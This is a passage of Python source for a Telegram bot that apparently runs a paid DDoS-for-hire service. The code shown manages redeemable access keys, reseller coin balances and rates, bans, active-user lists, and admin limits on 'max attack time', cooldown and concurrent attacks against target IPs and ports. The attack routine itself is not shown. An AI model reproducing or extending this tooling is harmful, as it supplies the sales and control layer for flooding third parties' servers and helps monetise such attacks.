        f"┃  ✅ KEY REDEEMED!             ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  ⏱️ +{duration_str}            ┃\n"
        f"┃  📅 {new_expiry.strftime('%Y-%m-%d')}\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                 OWNER COMMANDS (CONTINUED)
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['reseller'])
def reseller_panel(message):
    user_id = str(message.from_user.id)
    if user_id not in data.get("resellers", {}) and not is_owner(message.from_user.id):
        return

    balance = data.get("resellers", {}).get(user_id, {}).get("balance", 0)
    rates = data.get("rates", {})
    
    text = "<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    text += "┃  📛 RESELLER PANEL          ┃\n"
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    text += f"┃  💰 BALANCE: {balance}         ┃\n"
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    text += "┃  💲 RATES:                    ┃\n"
    
    for r, c in list(rates.items())[:4]:
        text += f"┃  • {r}: {c} coins\n"
    
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    text += "┃  🔹 /gen duration            ┃\n"
    text += "┃  🔹 /bankey key              ┃\n"
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    
    bot.reply_to(message, text, parse_mode="HTML")
    
@bot.message_handler(commands=['add_reseller', 'add_balance'])
def add_reseller(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ USAGE ERROR               ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  /add_reseller id bal         ┃\n"
            "┃  or /add_balance id amt       ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    try:
        uid = parts[1]
        balance_to_add = int(parts[2])
        
        if str(uid) not in data.get("resellers", {}):
            data["resellers"][str(uid)] = {"balance": 0}
        
        current_balance = data["resellers"][str(uid)].get("balance", 0)
        new_balance = current_balance + balance_to_add
        data["resellers"][str(uid)]["balance"] = new_balance
        save_data()
        
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ BALANCE UPDATED!          ┃\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  👤 {uid}                    ┃\n"
            f"┃  📊 OLD: {current_balance}    ┃\n"
            f"┃  ➕ +{balance_to_add}         ┃\n"
            f"┃  💰 NEW: {new_balance}        ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID USER OR AMOUNT    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['deduct_balance'])
def deduct_balance(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /deduct_balance           ┃\n"
            "┃     user_id amount            ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    try:
        uid = parts[1]
        amount = int(parts[2])
        
        if str(uid) not in data.get("resellers", {}):
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ USER IS NOT A RESELLER    ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
            return

        current = data["resellers"][str(uid)].get("balance", 0)
        new_balance = max(0, current - amount)
        data["resellers"][str(uid)]["balance"] = new_balance
        save_data()
        
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ BALANCE DEDUCTED!         ┃\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  👤 {uid}                    ┃\n"
            f"┃  ➖ -{amount}                 ┃\n"
            f"┃  💰 NEW: {new_balance}        ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID AMOUNT!           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /remove_reseller id       ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    uid = parts[1]
    if str(uid) in data.get("resellers", {}):
        del data["resellers"][str(uid)]
        save_data()
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ RESELLER {uid} REMOVED!    ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    else:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ USER IS NOT A RESELLER    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        
@bot.message_handler(commands=['list_resellers'])
def list_resellers(message):
    if not is_owner(message.from_user.id):
        return
        
    resellers = data.get("resellers", {})
    if not resellers:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📋 NO RESELLERS FOUND        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    text = "<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    text += "┃  📛 RESELLERS LIST           ┃\n"
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    
    for uid, rdata in list(resellers.items())[:10]:
        balance = rdata.get("balance", 0)
        text += f"┃  👤 {uid} 💰{balance}\n"
    
    if len(resellers) > 10:
        text += f"┃  ... and {len(resellers)-10} more\n"
    
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['set_rate'])
def set_rate(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /set_rate dur cost        ┃\n"
            "┃  ex: /set_rate 1d 50         ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    duration = parts[1]
    try:
        cost = int(parts[2])
        data["rates"][duration] = cost
        save_data()
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ RATE SET!                 ┃\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  {duration} = {cost} coins      ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID COST!             ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['set_custom_rate'])
def set_custom_rate(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /set_custom_rate id dur cost ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    uid, duration = parts[1], parts[2]
    try:
        cost = int(parts[3])
        
        if str(uid) not in data.get("resellers", {}):
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ USER IS NOT A RESELLER    ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
            return

        if "custom_rates" not in data["resellers"][str(uid)]:
            data["resellers"][str(uid)]["custom_rates"] = {}
        
        data["resellers"][str(uid)]["custom_rates"][duration] = cost
        save_data()
        
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ CUSTOM RATE SET!          ┃\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  👤 {uid}                    ┃\n"
            f"┃  {duration} = {cost} coins      ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID COST!             ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          BAN/UNBAN COMMANDS
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /ban user_id              ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    try:
        uid = int(parts[1])
        
        if uid in BOT_OWNERS:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ CANNOT BAN A BOT OWNER    ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
            return
        
        if "banned_users" not in data:
            data["banned_users"] = []
        
        if uid not in data["banned_users"]:
            data["banned_users"].append(uid)
            save_data()
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ✅ USER {uid} BANNED!         ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
        else:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ⚠️ USER IS ALREADY BANNED    ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID USER ID           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /unban user_id            ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    try:
        uid = int(parts[1])
        
        if uid in data.get("banned_users", []):
            data["banned_users"].remove(uid)
            save_data()
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ✅ USER {uid} UNBANNED!       ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
        else:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ⚠️ USER IS NOT BANNED        ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID USER ID           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['banned_list'])
def banned_list(message):
    if not is_admin(message.from_user.id):
        return

    banned = data.get("banned_users", [])
    if not banned:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📋 NO BANNED USERS           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    text = "<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    text += "┃  🚫 BANNED USERS              ┃\n"
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    
    for i, uid in enumerate(banned[:15], 1):
        text += f"┃  {i}. {uid}\n"
    
    if len(banned) > 15:
        text += f"┃  ... and {len(banned)-15} more\n"
    
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['allusers'])
def all_users(message):
    if not is_admin(message.from_user.id):
        return

    users = data.get("users", {})
    active_users = []
    now = datetime.now()
    
    for uid, udata in users.items():
        expiry_str = udata.get("expiry_time")
        if expiry_str:
            try:
                expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                if expiry > now:
                    active_users.append((uid, expiry_str))
            except:
                pass
    
    if not active_users:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📋 NO ACTIVE USERS FOUND     ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    summary = f"<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    summary += f"┃  👥 ACTIVE USERS: {len(active_users)}     ┃\n"
    summary += f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, summary, parse_mode="HTML")
    
    if len(active_users) <= 20:
        text = "<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        text += "┃  📋 ACTIVE USERS LIST         ┃\n"
        text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        for uid, exp in active_users:
            short_exp = exp[:10]
            text += f"┃  👤 {uid} │ 📅 {short_exp}\n"
        text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
        bot.reply_to(message, text, parse_mode="HTML")
    else:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📄 SENDING FILE...           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        
        import io
        file_content = f"─── ACTIVE USERS ({len(active_users)}) ───\n\n"
        for uid, exp in active_users:
            file_content += f"USER ID: {uid} │ EXPIRY: {exp}\n"
        
        file_bio = io.BytesIO(file_content.encode('utf-8'))
        file_bio.name = "active_users.txt"
        bot.send_document(message.chat.id, file_bio)

# ═══════════════════════════════════════════════════════════════════════════
#                          ALL KEYS COMMAND
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['all_keys'])
def all_keys(message):
    if not is_owner(message.from_user.id):
        return
        
    keys_db = data.get("keys", {})
    if not keys_db:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📋 NO KEYS FOUND             ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    # Create file with all keys
    import io
    file_content = "─── ALL KEYS ───\n\n"
    
    for key, info in keys_db.items():
        status = info.get("status", "active")
        duration = info.get("duration_str", "Unknown")
        generated_by = info.get("generated_by", "Unknown")
        created_at = info.get("created_at", "Unknown")
        
        file_content += f"KEY: {key}\n"
        file_content += f"STATUS: {status.upper()}\n"
        file_content += f"DURATION: {duration}\n"
        file_content += f"GENERATED BY: {generated_by}\n"
        file_content += f"CREATED: {created_at}\n"
        
        if status == "redeemed":
            redeemed_by = info.get("redeemed_by", "Unknown")
            redeemed_at = info.get("redeemed_at", "Unknown")
            file_content += f"REDEEMED BY: {redeemed_by}\n"
            file_content += f"REDEEMED AT: {redeemed_at}\n"
        
        file_content += "\n"
    
    file_bio = io.BytesIO(file_content.encode('utf-8'))
    file_bio.name = "all_keys.txt"
    bot.send_document(message.chat.id, file_bio)

@bot.message_handler(commands=['bankey'])
def ban_key(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /bankey key               ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    key = parts[1]
    keys_db = data.get("keys", {})
    
    if key not in keys_db:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID KEY!              ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    if keys_db[key].get("status") == "banned":
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ KEY IS ALREADY BANNED     ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    if keys_db[key].get("status") == "redeemed":
        redeemed_by = keys_db[key].get("redeemed_by")
        if redeemed_by and redeemed_by in data.get("users", {}):
            now = datetime.now()
            data["users"][redeemed_by]["expiry_time"] = now.strftime("%Y-%m-%d %H:%M:%S")
            try:
                bot.send_message(int(redeemed_by),
                    f"<pre>\n"
                    f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃  🚫 KEY {key} WAS BANNED       ┃\n"
                    f"┃  YOUR ACCESS HAS BEEN REVOKED  ┃\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"</pre>", parse_mode="HTML")
            except:
                pass
    
    keys_db[key]["status"] = "banned"
    save_data()
    
    bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  ✅ KEY {key} BANNED!          ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          SETTINGS COMMANDS
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['settime'])
def set_max_time(message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /settime seconds          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    try:
        t = int(parts[1])
        if t < 10 or t > 600:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ TIME 10-600 SECONDS       ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
            return
        data["max_attack_time"] = t
        save_data()
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ MAX TIME: {t}s             ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID NUMBER!           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /setcooldown sec          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    try:
        c = int(parts[1])
        if c < 0 or c > 600:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ COOLDOWN 0-600 SECONDS    ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
            return
        data["cooldown"] = c
        save_data()
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ COOLDOWN: {c}s             ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID NUMBER!           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['setconcurrent'])
def set_concurrent(message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /setconcurrent num        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    try:
        c = int(parts[1])
        if c > DEFAULT_CONCURRENT:
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ❌ MAX CONCURRENT {DEFAULT_CONCURRENT} ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
            return
        if c < 1:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ MINIMUM IS 1              ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
            return
        data["concurrent"] = c
        save_data()
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ CONCURRENT: {c}            ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID NUMBER!           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          PORT COMMANDS
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['port_protection'])
def toggle_port_protection(message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() not in ['on', 'off']:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /port_protection on/off   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    state = parts[1].lower() == 'on'
    data["port_protection"] = state
    save_data()
    
    status = "ON" if state else "OFF"
    bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  🛡️ PORT PROTECTION: {status}    ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

@bot.message_handler(commands=['block_port'])
def block_port(message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /block_port ip port       ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    ip = parts[1]
    port = parts[2]

    if not validate_target(ip):
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID IP ADDRESS        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    try:
        p = int(port)
        if p < 1 or p > 65535:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ PORT 1-65535             ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
            return
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID PORT!             ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    key = f"{ip}:{port}"
    if "blocked_ports" not in data:
        data["blocked_ports"] = {}
    data["blocked_ports"][key] = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
    save_data()
    
    bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  🚫 PORT BLOCKED: {key}        ┃\n"
        f"┃  ⏳ 2 HOURS DURATION           ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

@bot.message_handler(commands=['unblock_port'])
def unblock_port(message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /unblock_port ip port     ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    key = f"{parts[1]}:{parts[2]}"
    blocked = data.get("blocked_ports", {})
    
    if key in blocked:
        del blocked[key]
        save_data()
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ PORT UNBLOCKED: {key}      ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    else:
        bot.reply_to(message,
